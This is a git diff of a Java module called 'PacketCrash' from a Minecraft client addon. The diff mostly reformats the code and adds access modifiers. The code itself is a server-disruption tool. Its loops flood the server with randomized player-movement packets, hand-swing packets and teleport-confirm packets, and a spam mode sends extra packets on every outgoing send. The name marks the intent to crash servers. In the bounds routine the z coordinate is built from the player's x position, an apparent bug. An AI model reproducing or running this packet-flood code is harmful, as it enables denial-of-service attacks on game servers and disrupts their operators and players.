@@ -17,14 +17,14 @@ import net.minecraft.util.Hand;
 
 import java.util.Random;
 
-/*
-Made by OLEPOSSU / Raksamies and KassuK
-*/
-
+/**
+ * @author OLEPOSSU
+ */
 public class PacketCrash extends BlackOutModule {
     public PacketCrash() {
         super(BlackOut.BLACKOUT, "Packet Crash", "Sends packets");
     }
+
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
     private final Setting<SendMode> mode = sgGeneral.add(new EnumSetting.Builder<SendMode>()
         .name("Mode")
@@ -107,14 +107,16 @@ public class PacketCrash extends BlackOutModule {
         .visible(() -> mode.get().equals(SendMode.Spam))
         .build()
     );
+
     public enum SendMode {
         Spam,
         InstantBound
     }
-    int rur = 0;
-    int sent = 0;
-    String info = "Packets: ";
-    Random r = new Random();
+
+    private int rur = 0;
+    private int sent = 0;
+    private String info = "Packets: ";
+    private final Random r = new Random();
 
     @Override
     public void onActivate() {
@@ -154,6 +156,7 @@ public class PacketCrash extends BlackOutModule {
             }
         }
     }
+
     @EventHandler
     private void onSend(PacketEvent.Send e) {
         if (mode.get().equals(SendMode.Spam)) {
@@ -163,23 +166,27 @@ public class PacketCrash extends BlackOutModule {
             }
         }
     }
+
     @Override
     public String getInfoString() {
         return mode.get().equals(SendMode.Spam) ? info : null;
     }
-    void sendBounds(int amount) {
+
+    private void sendBounds(int amount) {
         for (int i = 0; i < amount; i++) {
             float x = (float) Math.cos(Math.toRadians(r.nextFloat() * 360 + 90));
             float z = (float) Math.sin(Math.toRadians(r.nextFloat() * 360 + 90));
             mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + x * boundsDist.get(), mc.player.getY(), mc.player.getX() + z * boundsDist.get(), mc.player.isOnGround()));
         }
     }
-    void sendSwings(int amount) {
+
+    private void sendSwings(int amount) {
         for (int i = 0; i < amount; i++) {
             mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Math.round(r.nextFloat()) == 0 ? Hand.MAIN_HAND : Hand.OFF_HAND));
         }
     }
-    void sendConfirms(int amount) {
+
+    private void sendConfirms(int amount) {
         for (int i = 0; i < amount; i++) {
             mc.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(sent));
         }
